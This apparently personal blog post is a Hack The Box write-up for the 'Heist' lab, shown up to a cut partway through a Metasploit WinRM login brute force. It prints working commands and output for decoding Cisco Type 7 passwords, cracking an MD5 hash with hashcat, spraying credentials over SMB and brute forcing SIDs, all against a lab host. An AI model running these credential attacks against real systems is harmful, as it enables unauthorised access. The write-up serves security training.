<!DOCTYPE html><html lang="en" data-mode="light" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="theme-color" media="(prefers-color-scheme: light)" content="#f7f7f7"><meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1b1b1e"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black-translucent"><meta name="viewport" content="width=device-width, user-scalable=no initial-scale=1, shrink-to-fit=no, viewport-fit=cover" ><meta name="generator" content="Jekyll v4.4.1" /><meta property="og:title" content="Hack The Box - Heist" /><meta property="og:locale" content="en" /><meta name="description" content="Just writing my notes here." /><meta property="og:description" content="Just writing my notes here." /><link rel="canonical" href="https://niraj-maharjan.com.np/posts/Hack-The-Box-Hiest/" /><meta property="og:url" content="https://niraj-maharjan.com.np/posts/Hack-The-Box-Hiest/" /><meta property="og:site_name" content="Niraj Maharjan" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2023-01-29T00:00:00-05:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Hack The Box - Heist" /><meta name="twitter:site" content="@NirajjjZzz" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2023-01-30T03:57:06-05:00","datePublished":"2023-01-29T00:00:00-05:00","description":"Just writing my notes here.","headline":"Hack The Box - Heist","mainEntityOfPage":{"@type":"WebPage","@id":"https://niraj-maharjan.com.np/posts/Hack-The-Box-Hiest/"},"url":"https://niraj-maharjan.com.np/posts/Hack-The-Box-Hiest/"}</script><title>Hack The Box - Heist | Niraj Maharjan</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Niraj Maharjan"><meta name="application-name" content="Niraj Maharjan"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tocbot@4.20.1/dist/tocbot.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" class="mx-auto"> <img src="/assets/img/favicons/ms-icon-150x150.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title"> <a href="/">Niraj Maharjan</a></div><div class="site-subtitle font-italic">InfoSec Enthusiast</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://linkedin.com/in/niraj-maharjan" aria-label="linkedin" target="_blank" rel="noopener noreferrer"> <i class="fab fa-linkedin"></i> </a> <a href="https://github.com/nirajmaharz" aria-label="github" target="_blank" rel="noopener noreferrer"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/NirajjjZzz" aria-label="twitter" target="_blank" rel="noopener noreferrer"> <i class="fab fa-twitter"></i> </a> <a href="javascript:location.href = 'mailto:' + ['niraj.maharz','gmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper"><div id="topbar" class="container d-flex align-items-center justify-content-between h-100 pl-3 pr-3 pl-md-4 pr-md-4"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Hack The Box - Heist</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper" class="d-flex justify-content-center"><div id="main" class="container pl-xl-4 pr-xl-4"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-9 pr-xl-4"><div class="post pl-1 pr-1 pl-md-2 pr-md-2"><h1 data-toc-skip>Hack The Box - Heist</h1><div class="post-meta text-muted"> <span> Posted <em class="" data-ts="1674968400" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Jan 29, 2023 </em> </span> <span> Updated <em class="" data-ts="1675069026" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Jan 30, 2023 </em> </span><div class="d-flex justify-content-between"> <span> By <em> <a href="https://twitter.com/username">Niraj Maharjan</a> </em> </span><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1891 words"> <em>10 min</em> read</span></div></div></div><div class="post-content"><p><a href="/assets/Hackthebox/Heist/0.png" class="popup img-link shimmer"><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 90% 70%'%3E%3C/svg%3E" data-src="/assets/Hackthebox/Heist/0.png" width="90%" height="70%" class="lazyload" data-proofer-ignore></a></p><p>Heist was an easy box that involved some password cracking and dumping Firefoxâ€™s processes.At first, we found a Cisco configuration file on the website that contained usernames and password hashes. After recovering passwords, we found one that worked to get RPC access, through which we found more usernames. We then got a Winrm session from one of these usernames and passwords. We observed that Firefox was running and dumped its process memory to uncover the password for the website, which also happened to be the administrator password for the system.</p><h2 id="recon"><span class="mr-2">RECON</span><a href="#recon" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><h2 id="nmap"><span class="mr-2">NMAP</span><a href="#nmap" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Starting with <code class="language-plaintext highlighter-rouge">nmap</code> it shows few ports open.</p><ul><li>Port 80: Microsoft IIS httpd 10.0<li>Port 135: Microsoft Windows RPC<li>Port 445: SMB<li>Port 5985: WinRM</ul><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
</pre><td class="rouge-code"><pre><span class="nv">$sudo</span> nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-p-</span> <span class="nt">--min-rate</span> 10000 <span class="nt">-oN</span> Heist-all-tcp.nmap 10.10.10.149 
<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>niraz: 
Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2023-01-09 07:32 +0545 
Nmap scan report <span class="k">for </span>10.10.10.149 
Host is up <span class="o">(</span>0.079s latency<span class="o">)</span><span class="nb">.</span> 
Not shown: 65530 filtered tcp ports <span class="o">(</span>no-response<span class="o">)</span> 
PORT      STATE SERVICE       VERSION 
80/tcp    open  http          Microsoft IIS httpd 10.0 
| http-methods: 
|_  Potentially risky methods: TRACE 
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not <span class="nb">set</span> 
| http-title: Support Login Page 
|_Requested resource was login.php 
|_http-server-header: Microsoft-IIS/10.0 
135/tcp   open  msrpc         Microsoft Windows RPC 
445/tcp   open  microsoft-ds? 
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span> 
|_http-title: Not Found 
|_http-server-header: Microsoft-HTTPAPI/2.0 
49669/tcp open  msrpc         Microsoft Windows RPC 
Service Info: OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows 
Host script results: 
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required 
| smb2-time: 
|   <span class="nb">date</span>: 2023-01-09T01:49:00 
|_  start_date: N/A 
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span> 
Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>109.73 seconds
</pre></table></code></div></div><h2 id="web---enumeration"><span class="mr-2">WEB - ENUMERATION</span><a href="#web---enumeration" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>It presents a login form.</p><p><a href="/assets/Hackthebox/Heist/1.png" class="popup img-link shimmer"><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 60% 50%'%3E%3C/svg%3E" data-src="/assets/Hackthebox/Heist/1.png" width="60%" height="50%" class="lazyload" data-proofer-ignore></a></p><p>tried some basic email and password, it did not work.</p><h3 id="login-as-guest"><span class="mr-2">LOGIN AS GUEST</span><a href="#login-as-guest" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p><a href="/assets/Hackthebox/Heist/2.png" class="popup img-link shimmer"><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100% 100%'%3E%3C/svg%3E" data-src="/assets/Hackthebox/Heist/2.png" width="100%" height="100%" class="lazyload" data-proofer-ignore></a></p><p>After login as <code class="language-plaintext highlighter-rouge">guest</code>, we can see itâ€™s some kind of support portal and <code class="language-plaintext highlighter-rouge">hazard</code> has uploaded cisco router configuration file as an attachment.We can view the configuration file.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
</pre><td class="rouge-code"><pre>version 12.2 
no service pad 
service password-encryption 
! 
isdn switch-type basic-5ess 
! 
hostname ios-1 
! 
security passwords min-length 12 
enable secret 5 $1$pdQG$o8nrSzsGXeaduXrjlvKc91 
! 
username rout3r password 7 0242114B0E143F015F5D1E161713 
username admin privilege 15 password 7 02375012182C1A1D751618034F36415408 
! 
! 
ip ssh authentication-retries 5 
ip ssh version 2 
! 
! 
router bgp 100 
 synchronization 
 bgp log-neighbor-changes 
 bgp dampening 
 network 192.168.0.0Ã‚ mask 300.255.255.0 
 timers bgp 3 9 
 redistribute connected 
! 
ip classless 
ip route 0.0.0.0 0.0.0.0 192.168.0.1 
! 
! 
access-list 101 permit ip any any 
dialer-list 1 protocol ip list 101 
! 
no ip http server 
no ip http secure-server 
! 
line vty 0 4 
 session-timeout 600 
 authorization exec SSH 
 transport input ssh
</pre></table></code></div></div><p>From the above configuration file we can see there are three password hashes.</p><div class="table-wrapper"><table><thead><tr><th>Hash<th>Hash Type<tbody><tr><td>$1$pdQG$o8nrSzsGXeaduXrjlvKc91<td>Cisco Type 5 salted md5<tr><td>0242114B0E143F015F5D1E161713<td>Cisco Type 7<tr><td>02375012182C1A1D751618034F36415408<td>Cisco Type 7</table></div><h3 id="type-7-decrypt"><span class="mr-2">TYPE 7 DECRYPT</span><a href="#type-7-decrypt" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p><code class="language-plaintext highlighter-rouge">Type 7</code> password can be decrypted using any online tools. Using this <a href="https://www.firewall.cx/cisco-technical-knowledgebase/cisco-routers/358-cisco-type7-password-crack.html">tool</a> to decrypt type 7 password.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>0242114B0E143F015F5D1E161713: $uperP@ssword
02375012182C1A1D751618034F36415408:  Q4)sJu\Y8qz*A3?d
</pre></table></code></div></div><h3 id="type-5-decrypt"><span class="mr-2">TYPE 5 DECRYPT</span><a href="#type-5-decrypt" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Using <code class="language-plaintext highlighter-rouge">hashcat</code> to decrypt this hash.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre><td class="rouge-code"><pre>$hashcat -m 500 hash /usr/share/wordlists/rockyou.txt

$1$pdQG$o8nrSzsGXeaduXrjlvKc91:stealth1agent  
Session..........: hashcat  
Status...........: Cracked  
Hash.Name........: md5crypt, MD5 (Unix), Cisco-IOS $1$ (MD5)  
Hash.Target......: $1$pdQG$o8nrSzsGXeaduXrjlvKc91  
Time.Started.....: Mon Jan  9 08:11:22 2023 (8 mins, 46 secs)  
Time.Estimated...: Mon Jan  9 08:20:08 2023 (0 secs)  
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)  
Guess.Queue......: 1/1 (100.00%)  
Speed.#1.........:     6644 H/s (20.35ms) @ Accel:256 Loops:250 Thr:1 Vec:16  
Recovered........: 1/1 (100.00%) Digests  
Progress.........: 3543552/14344385 (24.70%)  
Rejected.........: 0/3543552 (0.00%)  
Restore.Point....: 3543040/14344385 (24.70%)  
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:750-1000  
Candidates.#1....: steauara -&gt; steakdi
</pre></table></code></div></div><p>now we have few usernames and passwords</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre>$cat usernames.txt 
admin 
rout3r 
Hazard 

$cat passwords.txt 
Q4)sJu\Y8qz*A3?d 
@sswordf 
stealth1agent
</pre></table></code></div></div><h3 id="smb---tcp-445"><span class="mr-2">SMB - TCP 445</span><a href="#smb---tcp-445" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>without creds</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>$smbmap -H 10.10.10.149 
[!] Authentication error on 10.10.10.149
</pre></table></code></div></div><p><code class="language-plaintext highlighter-rouge">smbmap</code> gives authentication error, it means to need valid creds to view the shares.</p><h3 id="crackmapexec"><span class="mr-2">CRACKMAPEXEC</span><a href="#crackmapexec" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Using <code class="language-plaintext highlighter-rouge">crackmapexec</code> we can give a list of username and password. Weâ€™ll use creds we have gather till now.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre><td class="rouge-code"><pre>$cme smb -u username.txt -p password.txt --shares 10.10.10.149 
SMB         10.10.10.149    445    SUPPORTDESK      [*] Windows 10.0 Build 17763 x64 (name:SUPPORTDESK) (domain:SupportDesk) (signing:False) (SMBv1:False) 
SMB         10.10.10.149    445    SUPPORTDESK      [-] SupportDesk\admin:Q4)sJu\Y8qz*A3?d STATUS_LOGON_FAILURE 
SMB         10.10.10.149    445    SUPPORTDESK      [-] SupportDesk\admin:@sswordf STATUS_LOGON_FAILURE 
SMB         10.10.10.149    445    SUPPORTDESK      [-] SupportDesk\admin:stealth1agent STATUS_LOGON_FAILURE 
SMB         10.10.10.149    445    SUPPORTDESK      [-] SupportDesk\rout3r:Q4)sJu\Y8qz*A3?d STATUS_LOGON_FAILURE 
SMB         10.10.10.149    445    SUPPORTDESK      [-] SupportDesk\rout3r:@sswordf STATUS_LOGON_FAILURE 
SMB         10.10.10.149    445    SUPPORTDESK      [-] SupportDesk\rout3r:stealth1agent STATUS_LOGON_FAILURE 
SMB         10.10.10.149    445    SUPPORTDESK      [-] SupportDesk\Hazard:Q4)sJu\Y8qz*A3?d STATUS_LOGON_FAILURE 
SMB       10.10.10.149    445    SUPPORTDESK      [-] SupportDesk\Hazard:@sswordf STATUS_LOGON_FAILURE 
SMB         10.10.10.149    445    SUPPORTDESK      [+] SupportDesk\Hazard:stealth1agent 
SMB         10.10.10.149    445    SUPPORTDESK      [+] Enumerated shares 
SMB         10.10.10.149    445    SUPPORTDESK      Share           Permissions     Remark 
SMB         10.10.10.149    445    SUPPORTDESK      -----           -----------     ------ 
SMB         10.10.10.149    445    SUPPORTDESK      ADMIN$                          Remote Admin 
SMB         10.10.10.149    445    SUPPORTDESK      C$                              Default share 
SMB         10.10.10.149    445    SUPPORTDESK      IPC$            READ            Remote IPC
</pre></table></code></div></div><p>and we found the valid creds <code class="language-plaintext highlighter-rouge">Hazard:stealth1agent</code> . we can now re run <code class="language-plaintext highlighter-rouge">smbmap</code> with this creds.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>$smbmap -u hazard -p stealth1agent -H 10.10.10.149 
[+] IP: 10.10.10.149:445        Name: 10.10.10.149 
        Disk                                                    Permissions     Comment 
        ----                                                    -----------     ------- 
        ADMIN$                                                  NO ACCESS       Remote Admin 
        C$                                                      NO ACCESS       Default share 
        IPC$                                                    READ ONLY       Remote IPC
</pre></table></code></div></div><h3 id="rpcclient"><span class="mr-2">RPCCLIENT</span><a href="#rpcclient" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>$rpcclient -U 'hazard%stealth1agent' 10.10.10.149
</pre></table></code></div></div><p>we can get SID of user we know using <code class="language-plaintext highlighter-rouge">lookupnames</code>.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>$rpcclient -U 'hazard%stealth1agent' 10.10.10.149 
$rpcclient $&gt; lookupnames hazard 
hazard S-1-5-21-4254423774-1266059056-3197185112-1008 (User: 1)
</pre></table></code></div></div><p>we can also get user accounts using the SID.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>$rpcclient $&gt; lookupsids S-1-5-21-4254423774-1266059056-3197185112-1008 
S-1-5-21-4254423774-1266059056-3197185112-1008 SUPPORTDESK\Hazard (1)
</pre></table></code></div></div><p>Using rpcclient with -c command to directly interact with the command line so that we can bruteforce SIDS.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre><span class="nv">$rpcclient</span> <span class="nt">-U</span> <span class="s1">'hazard%stealth1agent'</span> 10.10.10.149 <span class="nt">-c</span> <span class="s1">'lookupsids S-1-5-21-4254423774-1266059056-3197185112-1008'</span> 
S-1-5-21-4254423774-1266059056-3197185112-1008 SUPPORTDESK<span class="se">\H</span>azard <span class="o">(</span>1<span class="o">)</span>

<span class="nv">$for</span> i <span class="k">in</span> <span class="o">{</span>1000..1050<span class="o">}</span><span class="p">;</span><span class="k">do </span>rpcclient <span class="nt">-U</span> <span class="s1">'hazard%stealth1agent'</span> 10.10.10.149 <span class="nt">-c</span> <span class="s2">"lookupsids S-1-5-21-4254423774-1266059056-3197185112-</span><span class="nv">$i</span><span class="s2">"</span> | <span class="nb">grep</span> <span class="nt">-v</span> unknown<span class="p">;</span><span class="k">done 
</span>S-1-5-21-4254423774-1266059056-3197185112-1008 SUPPORTDESK<span class="se">\H</span>azard <span class="o">(</span>1<span class="o">)</span> 
S-1-5-21-4254423774-1266059056-3197185112-1009 SUPPORTDESK<span class="se">\s</span>upport <span class="o">(</span>1<span class="o">)</span> 
S-1-5-21-4254423774-1266059056-3197185112-1012 SUPPORTDESK<span class="se">\C</span>hase <span class="o">(</span>1<span class="o">)</span> 
S-1-5-21-4254423774-1266059056-3197185112-1013 SUPPORTDESK<span class="se">\J</span>ason <span class="o">(</span>1<span class="o">)</span>
</pre></table></code></div></div><p><code class="language-plaintext highlighter-rouge">impacket-lookupsid</code> can be used to bruteforce SIDs</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre>$impacket-lookupsid hazard:stealth1agent@10.10.10.149 
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation 
[*] Brute forcing SIDs at 10.10.10.149 
[*] StringBinding ncacn_np:10.10.10.149[\pipe\lsarpc] 
[*] Domain SID is: S-1-5-21-4254423774-1266059056-3197185112 
500: SUPPORTDESK\Administrator (SidTypeUser) 
501: SUPPORTDESK\Guest (SidTypeUser) 
503: SUPPORTDESK\DefaultAccount (SidTypeUser) 
504: SUPPORTDESK\WDAGUtilityAccount (SidTypeUser) 
513: SUPPORTDESK\None (SidTypeGroup) 
1008: SUPPORTDESK\Hazard (SidTypeUser) 
1009: SUPPORTDESK\support (SidTypeUser) 
1012: SUPPORTDESK\Chase (SidTypeUser) 
1013: SUPPORTDESK\Jason (SidTypeUser)
</pre></table></code></div></div><p>we have now got few more users. updating our usernames file.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre>$cat usernames.txt 
admin 
rout3r 
Hazard 
Administrator 
Guest 
support 
chase 
Jason
</pre></table></code></div></div><h2 id="shell-as-chase"><span class="mr-2">SHELL AS CHASE</span><a href="#shell-as-chase" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><h3 id="metasploit"><span class="mr-2">METASPLOIT</span><a href="#metasploit" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Using <code class="language-plaintext highlighter-rouge">metasploit</code> to find valid creds for winrm.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
</pre><td class="rouge-code"><pre><span class="o">[</span>msf]<span class="o">(</span>Jobs:0 Agents:0<span class="o">)</span> auxiliary<span class="o">(</span>scanner/winrm/winrm_login<span class="o">)</span> <span class="o">&gt;&gt;</span> show options 
Module options <span class="o">(</span>auxiliary/scanner/winrm/winrm_login<span class="o">)</span>: 
   Name              Current Setting  Required  Description 
   <span class="nt">----</span>              <span class="nt">---------------</span>  <span class="nt">--------</span>  <span class="nt">-----------</span> 
   BLANK_PASSWORDS   <span class="nb">false            </span>no        Try blank passwords <span class="k">for </span>all <span class="nb">users 
   </span>BRUTEFORCE_SPEED  5                <span class="nb">yes       </span>How fast to bruteforce, from 0 to 5 
   DB_ALL_CREDS      <span class="nb">false            </span>no        Try each user/password couple stored <span class="k">in </span>the current database 
   DB_ALL_PASS       <span class="nb">false            </span>no        Add all passwords <span class="k">in </span>the current database to the list 
   DB_ALL_USERS      <span class="nb">false            </span>no        Add all <span class="nb">users </span><span class="k">in </span>the current database to the list 
   DB_SKIP_EXISTING  none             no        Skip existing credentials stored <span class="k">in </span>the current database <span class="o">(</span>Accepted: none, user, user&amp;realm<span class="o">)</span> 
   DOMAIN            WORKSTATION      <span class="nb">yes       </span>The domain to use <span class="k">for </span>Windows authentification 
   PASSWORD                           no        A specific password to authenticate with 
   PASS_FILE         passwords.txt    no        File containing passwords, one per line 
   Proxies                            no        A proxy chain of format <span class="nb">type</span>:host:port[,type:host:port][...] 
   RHOSTS            10.10.10.149     <span class="nb">yes       </span>The target host<span class="o">(</span>s<span class="o">)</span>, see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit 
   RPORT             5985             <span class="nb">yes       </span>The target port <span class="o">(</span>TCP<span class="o">)</span> 
   SSL               <span class="nb">false            </span>no        Negotiate SSL/TLS <span class="k">for </span>outgoing connections 
   STOP_ON_SUCCESS   <span class="nb">true             yes       </span>Stop guessing when a credential works <span class="k">for </span>a host 
   THREADS           1                <span class="nb">yes       </span>The number of concurrent threads <span class="o">(</span>max one per host<span class="o">)</span> 
   URI               /wsman           <span class="nb">yes       </span>The URI of the WinRM service 
   USERNAME                           no        A specific username to authenticate as 
   USERPASS_FILE                      no        File containing <span class="nb">users </span>and passwords separated by space, one pair per line 
   USER_AS_PASS      <span class="nb">false            </span>no        Try the username as the password <span class="k">for </span>all <span class="nb">users 
   </span>USER_FILE         usernames.txt    no        File containing usernames, one per line 
   VERBOSE           <span class="nb">true             yes       </span>Whether to print output <span class="k">for </span>all attempts 
   VHOST                              no        HTTP server virtual host 
<span class="o">[</span>msf]<span class="o">(</span>Jobs:0 Agents:0<span class="o">)</span> auxiliary<span class="o">(</span>scanner/winrm/winrm_login<span class="o">)</span> <span class="o">&gt;&gt;</span> run 
<span class="o">[</span>-] 10.10.10.149: - LOGIN FAILED: WORKSTATION<span class="se">\a</span>dmin:Q4<span class="o">)</span>sJu<span class="se">\Y</span>8qz<span class="k">*</span>A3?d <span class="o">(</span>Incorrect: <span class="o">)</span> 
<span class="o">[</span>-] 10.10.10.149: - LOGIN FAILED: WORKSTATION<span class="se">\a</span>dmin:@sswordf <span class="o">(</span>Incorrect: <span class="o">)</span> 
